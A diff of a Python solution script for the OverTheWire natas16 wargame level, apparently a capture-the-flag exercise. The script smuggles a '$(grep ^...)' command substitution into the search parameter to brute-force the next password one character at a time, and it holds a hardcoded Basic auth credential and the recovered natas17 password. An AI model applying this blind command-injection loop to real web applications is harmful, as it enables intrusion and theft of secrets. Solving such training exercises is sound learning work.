@@ -8,14 +8,11 @@ import sys
 import urllib
 import urllib.parse
 
-# natas17 solution
-
 url = "http://natas16.natas.labs.overthewire.org/?needle=hello&submit=Search"
 headers = {
 "Authorization" : "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
 }
 
-#grep -i "one$(grep ^hella file.txt)" dictionary.txt
 standin = "Christians"
 query_prefix = standin + "$(grep ^"
 password = ""
@@ -24,17 +21,8 @@ legal_chars_string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUV
 example_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
 
 def tryletter(prefix, letter):
-    # print("-----------------------------------------------------")
-    # print("making request")
-
     query_url = "http://natas16.natas.labs.overthewire.org/?needle=" + urllib.parse.quote_plus(query_prefix + prefix + letter + query_suffix)
-    # print(query_url)
-
     response = requests.get(query_url, headers=headers)
-    # print(response.text)
-
-    # print(response.status)
-    # print("-----------------------------------------------------")
 
     if re.search(standin, response.text):
         return False
@@ -52,3 +40,6 @@ while len(prefix) < len(example_password):
             prefix += char
             break
     print("prefix: " + prefix)
+
+
+# natas17 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
